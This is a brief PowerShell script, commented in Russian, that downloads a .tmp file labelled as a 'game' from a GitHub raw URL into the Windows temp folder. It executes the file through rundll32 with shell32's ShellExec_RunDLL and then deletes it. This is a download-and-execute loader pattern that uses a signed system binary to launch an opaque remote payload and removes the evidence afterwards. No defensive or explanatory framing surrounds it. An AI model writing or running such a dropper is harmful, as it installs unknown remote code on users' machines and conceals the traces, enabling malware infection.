$ErrorActionPreference = "Stop"

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/bee2059e-df7f-4c09-a69b-821ccd8573c7.tmp"
$TempFile = Join-Path ([IO.Path]::GetTempPath()) "bee2059e-df7f-4c09-a69b-821ccd8573c7.tmp"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempFile -UseBasicParsing

# Путь к вашему файлу (для примера)
$TargetFile = "C:\Users\mertj\AppData\Local\Temp\bee2059e-df7f-4c09-a69b-821ccd8573c7.tmp"

# Формируем строку аргументов для rundll32
# Синтаксис: shell32.dll,ShellExec_RunDLL "путь_к_файлу"
$Arguments = "shell32.dll,ShellExec_RunDLL `"$TargetFile`""

# Запускаем rundll32 через Start-Process
Start-Process -FilePath "rundll32.exe" -ArgumentList $Arguments -Wait
Remove-Item $TempFile -Force -ErrorAction SilentlyContinue
